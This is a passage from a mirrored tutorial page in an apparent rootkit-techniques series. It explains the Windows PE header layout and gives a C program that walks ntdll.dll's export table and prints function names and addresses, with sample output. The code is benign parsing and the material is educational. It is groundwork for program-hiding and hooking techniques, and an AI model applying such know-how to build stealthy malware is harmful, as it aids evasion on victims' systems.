the address. Ntdll.dll along with kernel32.dll is loaded by windows at startup.
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void<span
style="mso-spacerun: yes">  </span>DisplayFunc(PVOID Base)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Every
DLL or exe file has a certain structure that is well documented. The dll
ntdll.dll is loaded in memory at location 77f80000 stored in variable Base. The
first two bytes are M and Z and the structure that starts here is documented in
the header files as IMAGE_DOS_HEADER. This is a good old dos header and the
member e_lfanew tells us where the actual PE header starts. This header has a
magic number of PE00. A small structure defined as IMAGE_FILE_HEADER starts
here. This is a small structure followed by a large 224 bytes structure called
IMAGE_OPRIONAL_HEADER. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIMAGE_DOS_HEADER
dos = (PIMAGE_DOS_HEADER) Base;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIMAGE_NT_HEADERS
nt = (PIMAGE_NT_HEADERS)(((char *)Base) + dos-&gt; e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIMAGE_DATA_DIRECTORY
expdir = nt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
size = expdir-&gt;Size;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
addr = expdir-&gt;VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIMAGE_EXPORT_DIRECTORY
exports = (PIMAGE_EXPORT_DIRECTORY)(((char *)(Base))+ addr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PULONG
functions = (PULONG)(((char *)Base) + exports-&gt;AddressOfFunctions);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PSHORT
ordinals = (PSHORT)(((char *)Base)+ exports-&gt;AddressOfNameOrdinals);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PULONG
names = (PULONG)(((char *)Base)+ exports-&gt;AddressOfNames);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PVOID
func=NULL;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
(i=0; i&lt;exports-&gt;NumberOfNames; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
ord = ordinals[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(functions[ord] &lt; addr || functions[ord]&gt;=addr+size)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;%s
%x\n&quot;,(char *)Base + names[i],functions[ord]);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE
j;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>j
= LoadLibrary(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DisplayFunc(j);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgBreakPoint
2144b<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint
18c08<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrintReturnControlC
21504<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
have written a lot in the past on PE files and if you find the explanation too
terse we would like you to move to our site where we have long tutorials on PE
files.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
class=MsoHyperlink><b><a href="../../security.html">Back to the main page</a></b></span><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><o:p></o:p></span></p>

</div>

</body>


<!-- Mirrored from www.vijaymukhi.com/security/rootkit/devicedriverhidingprograms1.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:42:00 GMT -->
</html>
